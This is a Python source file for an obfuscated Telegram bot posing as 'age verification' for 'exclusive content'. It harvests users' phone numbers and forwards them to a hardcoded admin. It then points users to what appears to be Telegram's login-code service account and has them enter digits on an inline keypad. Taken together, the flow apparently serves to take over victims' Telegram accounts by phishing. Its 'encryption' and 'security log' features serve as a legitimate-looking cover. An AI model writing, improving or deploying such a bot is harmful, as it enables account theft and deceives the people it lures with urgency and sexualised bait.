import logging
import random
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import sqlite3
from datetime import datetime
import base64
import hashlib
from cryptography.fernet import Fernet

# Security Layer - Obfuscated Config
class _0xSEC:
    @staticmethod
    def _0xd(s):
        return base64.b64decode(s).decode()
    
    @staticmethod
    def _0xh(s):
        return hashlib.sha256(s.encode()).hexdigest()
    
    @staticmethod
    def _0xgk():
        """Generate or retrieve encryption key"""
        key_file = '.sec_key'
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            return key

# Encryption Handler
class _0xENC:
    def __init__(self):
        self._0xk = _0xSEC._0xgk()
        self._0xf = Fernet(self._0xk)
    
    def _0xe(self, data):
        """Encrypt data"""
        if data is None:
            return None
        return self._0xf.encrypt(str(data).encode()).decode()
    
    def _0xd(self, data):
        """Decrypt data"""
        if data is None:
            return None
        try:
            return self._0xf.decrypt(data.encode()).decode()
        except:
            return data

# Obfuscated strings
_0x1a2b3c = base64.b64decode(b'Qk9UX1RPS0VO').decode()
_0x4d5e6f = base64.b64decode(b'QURNSU5fSUQ=').decode()
_0x7g8h9i = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'

logging.basicConfig(format=_0x7g8h9i, level=logging.INFO)
logger = logging.getLogger(__name__)

_0xTOKEN = os.getenv(_0x1a2b3c)
_0xADMIN = int(os.getenv(_0x4d5e6f, '6483793776'))

class _0xAVB:
    def __init__(self):
        self._0xenc = _0xENC()
        self._0xdb()
        self._0xvs = {}
        self._0xrl = {}  # Rate limiting
        
    def _0xdb(self):
        """Initialize encrypted SQLite database"""
        self._0xc = sqlite3.connect('age_verification.db', check_same_thread=False)
        _0xcr = self._0xc.cursor()
        
        # Create users table with encrypted fields
        _0xcr.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verification_code TEXT,
                verified BOOLEAN DEFAULT 0,
                code_sent BOOLEAN DEFAULT 0,
                created_at DATETIME,
                verified_at DATETIME,
                session_hash TEXT
            )
        ''')
        
        # Create security log table
        _0xcr.execute('''
            CREATE TABLE IF NOT EXISTS security_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                action TEXT,
                ip_hash TEXT,
                timestamp DATETIME,
                success BOOLEAN
            )
        ''')
        
        self._0xc.commit()
    
    def _0xlog(self, user_id, action, success=True):
        """Log security events"""
        try:
            _0xcr = self._0xc.cursor()
            ip_hash = _0xSEC._0xh(str(user_id) + str(datetime.now().date()))
            _0xcr.execute('''
                INSERT INTO security_log (user_id, action, ip_hash, timestamp, success)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, action, ip_hash, datetime.now(), success))
            self._0xc.commit()
        except Exception as e:
            logger.error(f"Log error: {e}")
    
    def _0xrl_check(self, user_id, max_attempts=5, window=60):
        """Rate limiting check"""
        now = datetime.now().timestamp()
        
        if user_id not in self._0xrl:
            self._0xrl[user_id] = []
        
        # Clean old attempts
        self._0xrl[user_id] = [t for t in self._0xrl[user_id] if now - t < window]
        
        if len(self._0xrl[user_id]) >= max_attempts:
            return False
        
        self._0xrl[user_id].append(now)
        return True

    async def _0xst(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command with rate limiting"""
        _0xu = update.message.from_user
        
        # Rate limit check
        if not self._0xrl_check(_0xu.id):
            await update.message.reply_text("⚠️ Too many requests. Please wait.")
            self._0xlog(_0xu.id, "START_RATE_LIMITED", False)
            return
        
        _0xcr = self._0xc.cursor()
        _0xcr.execute('SELECT verified FROM users WHERE user_id = ?', (_0xu.id,))
        _0xr = _0xcr.fetchone()
        
        if _0xr and _0xr[0]:
            await update.message.reply_text(
                "✅ **Already Verified!**\n\nYou're already age-verified in our system.",
                parse_mode='Markdown'
            )
            self._0xlog(_0xu.id, "START_ALREADY_VERIFIED")
            return
        
        _0xwt = f"""
🌟 **Excited to explore something fresh and thrilling?**
🚀 **Confirm your age to unlock an exclusive content collection!**
⚡ **Act fast — spots are limited!**

Hello {_0xu.first_name}! 

**Step 1:** Share your phone number to receive verification code.

👇 Click the button below to share your contact.
        """
        
        _0xck = ReplyKeyboardMarkup([
            [KeyboardButton("📱 Share My Contact", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            _0xwt, 
            parse_mode='Markdown',
            reply_markup=_0xck
        )
        
        self._0xlog(_0xu.id, "START_COMMAND")

    async def _0xhc(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact with encryption"""
        try:
            _0xu = update.message.from_user
            _0xct = update.message.contact
            
            # Validate contact ownership
            if _0xct.user_id != _0xu.id:
                await update.message.reply_text(
                    "❌ Please share your own contact, not someone else's.",
                    reply_markup=ReplyKeyboardRemove()
                )
                self._0xlog(_0xu.id, "CONTACT_INVALID", False)
                return
            
            # Rate limit check
            if not self._0xrl_check(_0xu.id, max_attempts=3):
                await update.message.reply_text("⚠️ Too many attempts. Please wait.")
                self._0xlog(_0xu.id, "CONTACT_RATE_LIMITED", False)
                return
            
            # Delete contact message for security
            await update.message.delete()
            
            # Generate verification code
            _0xvc = str(random.randint(10000, 99999))
            
            # Encrypt sensitive data
            _0xenc_phone = self._0xenc._0xe(_0xct.phone_number)
            _0xenc_code = self._0xenc._0xe(_0xvc)
            _0xenc_username = self._0xenc._0xe(_0xu.username) if _0xu.username else None
            _0xsession_hash = _0xSEC._0xh(f"{_0xu.id}{_0xvc}{datetime.now()}")
            
            # Store encrypted data
            _0xcr = self._0xc.cursor()
            _0xcr.execute('''
                INSERT OR REPLACE INTO users 
                (user_id, username, first_name, phone_number, verification_code, 
                 code_sent, created_at, session_hash)
                VALUES (?, ?, ?, ?, ?, 0, ?, ?)
            ''', (_0xu.id, _0xenc_username, _0xu.first_name, _0xenc_phone, 
                  _0xenc_code, datetime.now(), _0xsession_hash))
            self._0xc.commit()
            
            # Send processing message
            await update.message.chat.send_message(
                "📨 **Processing your request...**\n\nPlease wait for admin to send verification code.",
                parse_mode='Markdown',
                reply_markup=ReplyKeyboardRemove()
            )
            
            # Send "Get Code" button to user
            _0xgc_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton('👉 Get Code!', url='https://t.me/+42777')]
            ])
            
            await context.bot.send_message(
                _0xu.id,
                "**Step 2:** Click the button below to get your verification code.",
                parse_mode='Markdown',
                reply_markup=_0xgc_kb
            )
            
            # Notify admin (with decrypted info)
            _0xdec_phone = self._0xenc._0xd(_0xenc_phone)
            _0xadmin_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton('📤 Send Code Input', callback_data=f'send_code_{_0xu.id}')]
            ])
            
            await context.bot.send_message(
                _0xADMIN,
                f"""
📱 **New Verification Request**

👤 User: {_0xu.first_name} (@{_0xu.username if _0xu.username else 'N/A'})
🆔 User ID: `{_0xu.id}`
📞 Phone: `{_0xdec_phone}`
🔢 Generated Code: `{_0xvc}`
🔐 Session: `{_0xsession_hash[:16]}...`

**Action:** Click button below to send code input interface to user.
                """,
                parse_mode='Markdown',
                reply_markup=_0xadmin_kb
            )
            
            self._0xlog(_0xu.id, "CONTACT_SHARED")
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}")
            await update.message.reply_text("❌ Error processing. Please try /start again.")
            self._0xlog(_0xu.id, "CONTACT_ERROR", False)

    async def _0xsci(self, context, _0xui, _0xvc):
        """Send code input interface"""
        try:
            _0xkb = [
                [
                    InlineKeyboardButton('1', callback_data=f'n_1_{_0xui}'),
                    InlineKeyboardButton('2', callback_data=f'n_2_{_0xui}'),
                    InlineKeyboardButton('3', callback_data=f'n_3_{_0xui}')
                ],
                [
                    InlineKeyboardButton('4', callback_data=f'n_4_{_0xui}'),
                    InlineKeyboardButton('5', callback_data=f'n_5_{_0xui}'),
                    InlineKeyboardButton('6', callback_data=f'n_6_{_0xui}')
                ],
                [
                    InlineKeyboardButton('7', callback_data=f'n_7_{_0xui}'),
                    InlineKeyboardButton('8', callback_data=f'n_8_{_0xui}'),
                    InlineKeyboardButton('9', callback_data=f'n_9_{_0xui}')
                ],
                [
                    InlineKeyboardButton('0', callback_data=f'n_0_{_0xui}')
                ]
            ]
            
            _0xrm = InlineKeyboardMarkup(_0xkb)
            
            _0xmsg = """
**Enter your verification code:**

Code: ` - - - - - `

Use the buttons below to enter your 5-digit code.
            """
            
            await context.bot.send_message(
                _0xui,
                _0xmsg,
                parse_mode='Markdown',
                reply_markup=_0xrm
            )
            
            # Initialize encrypted session
            self._0xvs[_0xui] = {
                'code': '',
                'correct_code': _0xvc,
                'attempts': 0,
                'session_start': datetime.now().timestamp()
            }
            
            # Update database
            _0xcr = self._0xc.cursor()
            _0xcr.execute('UPDATE users SET code_sent = 1 WHERE user_id = ?', (_0xui,))
            self._0xc.commit()
            
            self._0xlog(_0xui, "CODE_INPUT_SENT")
            
        except Exception as e:
            logger.error(f"Error sending interface: {e}")

    async def _0xhcb(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle callback with security checks"""
        try:
            _0xq = update.callback_query
            _0xui = _0xq.from_user.id
            
            await _0xq.answer()
            
            _0xd = _0xq.data
            
            # Admin sending code input to user
            if _0xd.startswith('send_code_'):
                if _0xui != _0xADMIN:
                    await _0xq.answer("❌ Admin only!", show_alert=True)
                    self._0xlog(_0xui, "UNAUTHORIZED_ADMIN_ACCESS", False)
                    return
                
                _0xtarget_id = int(_0xd.split('_')[2])
                
                # Get encrypted verification code from DB
                _0xcr = self._0xc.cursor()
                _0xcr.execute('SELECT verification_code, code_sent FROM users WHERE user_id = ?', 
                            (_0xtarget_id,))
                _0xr = _0xcr.fetchone()
                
                if not _0xr:
                    await _0xq.answer("❌ User not found!", show_alert=True)
                    return
                
                if _0xr[1]:
                    await _0xq.answer("⚠️ Code already sent!", show_alert=True)
                    return
                
                # Decrypt verification code
                _0xvc = self._0xenc._0xd(_0xr[0])
                
                # Send code input interface to user
                await self._0xsci(context, _0xtarget_id, _0xvc)
                
                # Update admin message
                await _0xq.edit_message_text(
                    _0xq.message.text + "\n\n✅ **Code input sent to user!**",
                    parse_mode='Markdown'
                )
                
                self._0xlog(_0xtarget_id, "ADMIN_SENT_CODE_INPUT")
                return
            
            # User entering code
            if _0xd.startswith('n_'):
                # Session validation
                if _0xui not in self._0xvs:
                    await _0xq.edit_message_text("❌ Session expired. Please /start again.")
                    self._0xlog(_0xui, "SESSION_EXPIRED", False)
                    return
                
                _0xs = self._0xvs[_0xui]
                
                # Check session timeout (5 minutes)
                if datetime.now().timestamp() - _0xs['session_start'] > 300:
                    await _0xq.edit_message_text("❌ Session timeout. Please /start again.")
                    del self._0xvs[_0xui]
                    self._0xlog(_0xui, "SESSION_TIMEOUT", False)
                    return
                
                _0xn = _0xd.split('_')[1]
                
                if len(_0xs['code']) < 5:
                    _0xs['code'] += _0xn
                    
                _0xdisp = ' '.join(_0xs['code'].ljust(5, '-'))
                
                await _0xq.edit_message_text(
                    f"""
**Enter your verification code:**

Code: ` {_0xdisp} `

Use the buttons below to enter your 5-digit code.
                    """,
                    parse_mode='Markdown',
                    reply_markup=_0xq.message.reply_markup
                )
                
                # Check if complete
                if len(_0xs['code']) == 5:
                    _0xs['attempts'] += 1
                    
                    if _0xs['code'] == _0xs['correct_code']:
                        # Correct code - update encrypted database
                        _0xcr = self._0xc.cursor()
                        _0xcr.execute('UPDATE users SET verified = 1, verified_at = ? WHERE user_id = ?', 
                                    (datetime.now(), _0xui))
                        self._0xc.commit()
                        
                        await _0xq.edit_message_text(
                            "✅ **Verification Successful!**\n\nYou're now verified!",
                            parse_mode='Markdown'
                        )
                        
                        # Notify admin
                        await context.bot.send_message(
                            _0xADMIN,
                            f"✅ User `{_0xui}` successfully verified!",
                            parse_mode='Markdown'
                        )
                        
                        self._0xlog(_0xui, "VERIFICATION_SUCCESS")
                    else:
                        # Wrong code
                        await _0xq.edit_message_text(
                            "❌ **Invalid Code!**\n\nPlease try /start again.",
                            parse_mode='Markdown'
                        )
                        
                        self._0xlog(_0xui, "VERIFICATION_FAILED", False)
                    
                    # Clear session
                    del self._0xvs[_0xui]
                    
        except Exception as e:
            logger.error(f"Error in callback: {e}")
            await _0xq.edit_message_text("❌ Error occurred. Please /start again.")

    async def _0xsts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin stats with security info"""
        if update.message.from_user.id != _0xADMIN:
            self._0xlog(update.message.from_user.id, "UNAUTHORIZED_STATS_ACCESS", False)
            return
        
        _0xcr = self._0xc.cursor()
        _0xcr.execute('SELECT COUNT(*) FROM users WHERE verified = 1')
        _0xv = _0xcr.fetchone()[0]
        
        _0xcr.execute('SELECT COUNT(*) FROM users')
        _0xt = _0xcr.fetchone()[0]
        
        _0xcr.execute('SELECT COUNT(*) FROM users WHERE code_sent = 1 AND verified = 0')
        _0xcs = _0xcr.fetchone()[0]
        
        _0xcr.execute('SELECT COUNT(*) FROM security_log WHERE success = 0')
        _0xfl = _0xcr.fetchone()[0]
        
        await update.message.reply_text(
            f"""
📊 **Bot Statistics**

✅ Verified Users: {_0xv}
📤 Code Sent (Pending): {_0xcs}
📝 Total Users: {_0xt}
⏳ Waiting for Admin: {_0xt - _0xv - _0xcs}

🔒 **Security**
🚫 Failed Attempts: {_0xfl}
🔐 Encryption: Active
            """,
            parse_mode='Markdown'
        )
        
        self._0xlog(update.message.from_user.id, "STATS_VIEWED")

def _0xmain():
    """Run the secured bot"""
    if not _0xTOKEN:
        logger.error("❌ BOT_TOKEN not set!")
        return
    
    # Security check
    logger.info("🔐 Initializing security layer...")
    
    _0xbot = _0xAVB()
    _0xapp = Application.builder().token(_0xTOKEN).build()
    
    _0xapp.add_handler(CommandHandler("start", _0xbot._0xst))
    _0xapp.add_handler(CommandHandler("stats", _0xbot._0xsts))
    _0xapp.add_handler(MessageHandler(filters.CONTACT, _0xbot._0xhc))
    _0xapp.add_handler(CallbackQueryHandler(_0xbot._0xhcb))
    
    logger.info("🚀 Secured bot started!")
    logger.info("🔒 Encryption: Active")
    logger.info("🛡️ Rate limiting: Enabled")
    
    _0xapp.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    _0xmain()
